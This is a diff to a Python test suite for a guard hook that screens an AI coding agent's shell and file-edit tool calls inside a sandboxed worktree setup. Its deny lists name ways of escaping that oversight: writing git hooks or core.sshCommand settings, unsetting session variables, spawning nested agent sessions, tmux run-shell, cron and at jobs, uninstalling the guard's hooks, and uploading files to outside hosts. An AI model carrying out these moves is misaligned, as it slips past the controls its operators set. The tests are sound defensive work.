@@ -64,8 +64,8 @@ def set_mode(env, mode):
         json.dump({"mode": mode}, handle)
 
 
-def bash(command):
-    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
+def bash(command, cwd=None):
+    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": cwd or W})
 
 
 def run(env, payload):
@@ -226,8 +226,8 @@ def test_selftest_passes():
 W = "/sandbox/dev/wt"  # the worktree of the `kitchen` fixture
 
 
-def tool_event(tool, **tool_input):
-    return json.dumps({"tool_name": tool, "tool_input": tool_input})
+def tool_event(tool, cwd=None, **tool_input):
+    return json.dumps({"tool_name": tool, "tool_input": tool_input, "cwd": cwd or W})
 
 
 def sh(command):
@@ -391,6 +391,57 @@ DENY = [
     (*sh("rsync -a out/ rsync://build.example.net/in/"), "egress-upload", True),
     (*sh("sftp user@build.example.net"), "egress-upload", True),
     (*sh("bash -c 'curl -T x.tar https://example.com/up'"), "egress-upload", True),
+    # shared git config and process escape
+    (*sh("git config user.name Someone"), "git-config", True),
+    (*sh("git config --global core.editor vi"), "git-config", True),
+    (*sh("git config --unset core.editor"), "git-config", True),
+    (*sh("git config --local --add remote.origin.url x"), "git-config", True),
+    (*sh("git -C repo config core.hooksPath hooks"), "git-config", True),
+    (*sh("git -c core.hooksPath=/tmp/h commit -m x"), "git-config", True),
+    (*sh("git -c core.fsmonitor=./run status"), "git-config", True),
+    (*sh("git -c core.sshCommand=./run fetch"), "git-config", True),
+    (*sh("git -c CORE.SSHCOMMAND=./run fetch"), "git-config", True),
+    (*sh("git --config-env=core.hooksPath=H status"), "git-config", True),
+    (*sh("git remote add upstream https://example.com/x.git"), "git-config", True),
+    (*sh("git remote set-url origin https://example.com/x.git"), "git-config", True),
+    (*sh("git remote rename origin old"), "git-config", True),
+    (*sh('bash -c "git config user.email x"'), "git-config", True),
+    (*sh("echo x >> .git/config"), "git-config", True),
+    (*sh("cp hook.sh .git/hooks/pre-commit"), "git-config", True),
+    (*sh("rm -rf .git/worktrees"), "git-config", True),
+    (*sh("echo 'gitdir: /elsewhere' > .git"), "git-config", True),
+    ("Write", {"file_path": W + "/.git/hooks/pre-commit", "content": "x"}, "git-config", True),
+    ("Edit", {"file_path": W + "/.git/config", "old_string": "a", "new_string": "b"}, "git-config", True),
+    ("Write", {"file_path": W + "/.git", "content": "gitdir: /elsewhere"}, "git-config", True),
+    (*sh("claude -p hello"), "process-escape", True),
+    (*sh("/usr/local/bin/claude --version"), "process-escape", True),
+    (*sh("nohup claude -p hello &"), "process-escape", True),
+    (*sh('sh -c "claude -p hello"'), "process-escape", True),
+    (*sh("env -i /bin/sh"), "process-escape", True),
+    (*sh("env -u KITCHEN_SESSION /bin/sh"), "process-escape", True),
+    (*sh("unset KITCHEN_UNIT"), "process-escape", True),
+    (*sh("KITCHEN_SESSION=0 ls"), "process-escape", True),
+    (*sh("export KITCHEN_UNIT=U-2"), "process-escape", True),
+    (*sh("env CLAUDE_CONFIG_DIR=/x ls"), "process-escape", True),
+    (*sh("tmux new-session -d -s x"), "process-escape", True),
+    (*sh("tmux send-keys -t x ls Enter"), "process-escape", True),
+    (*sh("tmux kill-server"), "process-escape", True),
+    (*sh("tmux ls -F '#(id)'"), "process-escape", True),
+    (*sh("tmux display -p '#(id)'"), "process-escape", True),
+    (*sh("tmux -f evil.conf ls"), "process-escape", True),
+    (*sh("tmux ls \\; run-shell id"), "process-escape", True),
+    (*sh("launchctl load ~/x.plist"), "process-escape", True),
+    (*sh("crontab -e"), "process-escape", True),
+    (*sh("echo id | at now"), "process-escape", True),
+    (*sh("batch"), "process-escape", True),
+    (*sh("osascript -e 'tell app \"Finder\" to quit'"), "process-escape", True),
+    (*sh("open -a Terminal"), "process-escape", True),
+    (*sh("open Some.app"), "process-escape", True),
+    (*sh("python3 skills/orchestrate/scripts/unit_snapshot.py write doc --unit U-1"), "process-escape", True),
+    (*sh("python3 -I scripts/dispatcher.py start X"), "process-escape", True),
+    (*sh("python3 scripts/dispatcher.py limit set 3"), "process-escape", True),
+    (*sh("./scripts/install_hooks.py --uninstall"), "process-escape", True),
+    (*sh("python3 scripts/install_hooks.py"), "process-escape", True),
 ]
 
 # (rule the case is the control for, tool, input): same area as a DENY case, but allowed
@@ -473,6 +524,37 @@ PASS = [
     ("egress-upload", *sh("rsync -a ./out ../copy")),
     ("egress-upload", *sh("scp a.txt b.txt")),
     ("egress-upload", *sh("nc -z localhost 8080")),
+    ("git-config", *sh("git config --get user.name")),
+    ("git-config", *sh("git config --get-all remote.origin.fetch")),
+    ("git-config", *sh("git config --get-regexp 'remote.*'")),
+    ("git-config", *sh("git config --list")),
+    ("git-config", *sh("git config --local --get remote.origin.url")),
+    ("git-config", *sh("git config get user.name")),
+    ("git-config", *sh("git -c color.ui=never status")),
+    ("git-config", *sh("git -c core.editor=true commit -m x")),
+    ("git-config", *sh("git remote -v")),
+    ("git-config", *sh("git remote get-url origin")),
+    ("git-config", *sh("git remote show origin")),
+    ("git-config", *sh("git status")),
+    ("git-config", *sh("cat .git/config")),
+    ("git-config", *sh("echo x > .gitignore")),
+    ("git-config", "Write", {"file_path": W + "/.github/workflows/ci.yml", "content": "x"}),
+    ("git-config", "Write", {"file_path": W + "/docs/hooks/readme.md", "content": "x"}),
+    ("process-escape", *sh("tmux ls")),
+    ("process-escape", *sh("tmux -L private list-sessions")),
+    ("process-escape", *sh("tmux list-windows -t x")),
+    ("process-escape", *sh("tmux has-session -t x")),
+    ("process-escape", *sh("tmux display -p '#S'")),
+    ("process-escape", *sh("echo claude")),
+    ("process-escape", *sh("cat scripts/dispatcher.py")),
+    ("process-escape", *sh("python3 scripts/dispatcher.py --selftest")),
+    ("process-escape", *sh("python3 scripts/install_hooks.py --check")),
+    ("process-escape", *sh("python3 scripts/unit_snapshot.py show U-1")),
+    ("process-escape", *sh("python3 scripts/dispatcher.py limit get")),
+    ("process-escape", *sh("open README.md")),
+    ("process-escape", *sh("FOO=1 make test")),
+    ("process-escape", *sh("export FOO=1")),
+    ("process-escape", *sh("env FOO=1 pytest -q")),
 ]
 
 NEW_RULES = {r.name for r in guard.guard_rules.RULES} - {"merge", "sudo", "download-exec", "credential"}
@@ -796,3 +878,177 @@ def test_the_task_doc_and_the_manifest_are_not_outside_the_worktree(kitchen, tmp
     # without the snapshot nothing is exempt
     code, err = run(kitchen, tool_event("Edit", file_path="/sandbox/dev/tasks/U-1.md", old_string="a", new_string="b"))
     assert code == 2 and "guard: write-outside:" in err
+
+
+# --- identity tied to the cwd, kitchen detected by the cwd ----------------------------------
+
+WT = {"U-1": "/sandbox/dev/wt-U-1", "U-2": "/sandbox/dev/wt-U-2"}
+
+
+def unit_world(kitchen, tmp_path, name="U-1", **fields):
+    """The snapshot of unit `name` (invented worktree path) in a tmp folder; returns (env, worktree)."""
+    units = tmp_path / "units"
+    units.mkdir(exist_ok=True)
+    data = {"schema": 1, "unit": name, "worktree": WT[name], "allow_config": True}
+    data.update(fields)
+    (units / (name + ".json")).write_text(json.dumps(data), encoding="utf-8")
+    env = {**kitchen, "KITCHEN_UNIT": name, "KITCHEN_UNITS_DIR": str(units), "KITCHEN_WORKTREE": WT[name]}
+    return env, WT[name]
+
+
+def mcp_write(cwd):
+    return tool_event("Write", cwd=cwd, file_path=cwd + "/.mcp.json", content="{}")
+
+
+def test_the_unit_id_is_trusted_inside_its_own_worktree(kitchen, tmp_path):
+    env, worktree = unit_world(kitchen, tmp_path)
+    assert run(env, mcp_write(worktree)) == (0, "")  # the control: allow_config frees the file here
+    assert log_lines(env)[-1]["decision"] == "allow"
+    assert run(env, mcp_write(worktree + "/sub/dir"))[0] == 2  # a subfolder is not the root: still the file rule
+    assert log_lines(env)[-1]["rule"] == "config-protected"
+
+
+def test_another_units_id_gets_the_strictest_case(kitchen, tmp_path):
+    env, worktree = unit_world(kitchen, tmp_path)
+    other_env, other_worktree = unit_world(kitchen, tmp_path, name="U-2")
+    env["KITCHEN_UNIT"] = "U-2"  # the hook runs in U-1's worktree with U-2's variable
+    code, err = run(env, mcp_write(worktree))
+    assert code == 2 and "guard: config-protected:" in err
+    assert run(other_env, mcp_write(other_worktree)) == (0, "")  # the control: U-2 in its own worktree
+
+
+@pytest.mark.parametrize("cwd", ["/sandbox/dev", "/sandbox/dev/wt-U-1x", "/sandbox/dev/wt-U-2", "/tmp/elsewhere"])
+def test_a_cd_out_of_the_worktree_drops_the_snapshot(kitchen, tmp_path, cwd):
+    env, worktree = unit_world(kitchen, tmp_path)
+    event = tool_event("Write", cwd=cwd, file_path=worktree + "/.mcp.json", content="{}")
+    code, err = run(env, event)
+    assert code == 2 and "guard: config-protected:" in err  # the strictest case, whatever the target
+
+
+def test_the_unit_may_edit_its_task_doc_only_from_its_worktree(kitchen, tmp_path):
+    doc = "/sandbox/dev/tasks/U-1.md"
+    env, worktree = unit_world(kitchen, tmp_path, task_doc=doc)
+
+    def edit(cwd):
+        return tool_event("Edit", cwd=cwd, file_path=doc, old_string="x", new_string="y")
+
+    assert run(env, edit(worktree)) == (0, "")
+    code, err = run(env, edit("/sandbox/dev"))
+    assert code == 2 and "guard: write-outside:" in err
+
+
+def test_the_kitchen_runs_folder_binds_the_unit_to_its_kind_and_id(kitchen, tmp_path):
+    env, _worktree = unit_world(kitchen, tmp_path)
+    runs = "/sandbox/dev/.claude/kitchen-runs"
+
+    def write_mcp(cwd):
+        return tool_event("Write", cwd=cwd, file_path=WT["U-1"] + "/.mcp.json", content="{}")
+
+    assert run(env, write_mcp(runs + "/proof-U-1")) == (0, "")  # this unit's folder: the snapshot is trusted
+    code, err = run(env, write_mcp(runs + "/proof-U-2"))  # another unit's folder: the strictest case
+    assert code == 2 and "guard: config-protected:" in err
+    assert run(env, write_mcp(runs + "/U-1"))[0] == 2  # no `<kind>-` prefix: not this unit's folder
+
+
+def test_the_kitchen_is_detected_by_the_cwd_without_the_variables(kitchen, tmp_path):
+    env, worktree = unit_world(kitchen, tmp_path)
+    for name in ("KITCHEN_SESSION", "KITCHEN_UNIT"):
+        env.pop(name)
+    code, err = run(env, bash("git push origin main", cwd=worktree))
+    assert code == 2 and "guard: push:" in err
+    assert log_lines(env)[-1]["decision"] == "deny"
+    # without the unit id the snapshot is not trusted either: the strictest case
+    code, err = run(env, mcp_write(worktree))
+    assert code == 2 and "guard: config-protected:" in err
+    # the control: a cwd outside every worktree and runs folder is not the kitchen
+    before = len(log_lines(env))
+    assert run(env, bash("git push origin main", cwd="/sandbox/dev")) == (0, "")
+    assert len(log_lines(env)) == before
+
+
+def test_the_cwd_detection_covers_the_runs_folder_and_ignores_bad_events(kitchen, tmp_path):
+    env, _worktree = unit_world(kitchen, tmp_path)
+    for name in ("KITCHEN_SESSION", "KITCHEN_UNIT"):
+        env.pop(name)
+    runs = "/sandbox/dev/.claude/kitchen-runs/inspect-U-1"
+    assert run(env, bash("git push origin main", cwd=runs))[0] == 2
+    bad_cwd = json.dumps({"tool_name": "Bash", "tool_input": {"command": "git push"}, "cwd": 3})
+    for payload in ("", "{not json", "[]", bad_cwd):
+        assert run(env, payload) == (0, "")
+
+
+def test_a_broken_snapshot_in_the_units_folder_does_not_block_the_waiter(kitchen, tmp_path):
+    env, _worktree = unit_world(kitchen, tmp_path)
+    for name in ("KITCHEN_SESSION", "KITCHEN_UNIT"):
+        env.pop(name)
+    (tmp_path / "units" / "BAD.json").write_text("{not json", encoding="utf-8")
+    assert run(env, bash("git push origin main", cwd="/sandbox/dev")) == (0, "")
+
+
+# --- git config writes through a real linked worktree (POSIX paths: the guard targets macOS) --
+
+posix_only = pytest.mark.skipif(sys.platform == "win32", reason="real paths; the guard targets POSIX")
+
+
+@pytest.fixture
+def linked(kitchen, tmp_path):
+    """A main clone with a linked worktree laid out the way `git worktree add` leaves it."""
+    main = tmp_path / "clone"
+    admin = main / ".git" / "worktrees" / "wt"
+    admin.mkdir(parents=True)
+    (main / ".git" / "config").write_text("[core]\n", encoding="utf-8")
+    (main / ".git" / "hooks").mkdir()
+    (admin / "commondir").write_text("../..\n", encoding="utf-8")
+    worktree = tmp_path / "wt"
+    worktree.mkdir()
+    (worktree / ".git").write_text(f"gitdir: {admin}\n", encoding="utf-8")
+    return {**kitchen, "KITCHEN_WORKTREE": str(worktree)}, worktree, main
+
+
+def denied(env, event, rule):
+    code, err = run(env, event)
+    assert code == 2 and f"guard: {rule}:" in err, err
+    assert log_lines(env)[-1]["rule"] == rule
+
+
+@posix_only
+def test_writes_to_the_common_dir_of_a_linked_worktree_are_denied(linked):
+    env, worktree, main = linked
+    git = (main / ".git").as_posix()
+    cwd = str(worktree)
+    for mode in ("deny", "deny-irreversible"):
+        set_mode(env, mode)
+        denied(env, bash(f"echo x >> {git}/config", cwd=cwd), "git-config")
+        denied(env, bash(f"cp hook.sh {git}/hooks/pre-commit", cwd=cwd), "git-config")
+        denied(env, bash(f"rm -rf {git}/worktrees/wt", cwd=cwd), "git-config")
+        denied(env, bash(f"echo gitdir: /x > {worktree.as_posix()}/.git", cwd=cwd), "git-config")
+        denied(env, tool_event("Write", cwd=cwd, file_path=git + "/hooks/post-commit", content="x"), "git-config")
+        denied(env, tool_event("Edit", cwd=cwd, file_path=git + "/config", old_string="a", new_string="b"),
+               "git-config")
+        denied(env, tool_event("Write", cwd=cwd, file_path=str(worktree / ".git"), content="x"), "git-config")
+
+
+@posix_only
+def test_a_symlink_into_the_common_dir_is_followed(linked):
+    env, worktree, main = linked
+    try:
+        (worktree / "link").symlink_to(main / ".git" / "hooks", target_is_directory=True)
+    except (OSError, NotImplementedError):
+        pytest.skip("symlinks are not available here")
+    denied(env, tool_event("Write", cwd=str(worktree), file_path=str(worktree / "link" / "pre-push"),
+                           content="x"), "git-config")
+
+
+@posix_only
+def test_reads_and_ordinary_writes_around_a_linked_worktree_pass(linked):
+    env, worktree, main = linked
+    git = (main / ".git").as_posix()
+    cwd = str(worktree)
+    for mode in ("log", "deny-irreversible", "deny"):
+        set_mode(env, mode)
+        # the controls: the same files read, and other files of the same folders written
+        assert run(env, bash(f"cat {git}/config", cwd=cwd)) == (0, "")
+        assert run(env, bash("git config --get core.bare", cwd=cwd)) == (0, "")
+        assert run(env, bash("echo x > notes.txt", cwd=cwd)) == (0, "")
+        assert run(env, tool_event("Write", cwd=cwd, file_path=str(worktree / "src" / "a.py"), content="x")) == (0, "")
+        assert log_lines(env)[-1]["decision"] == "allow"
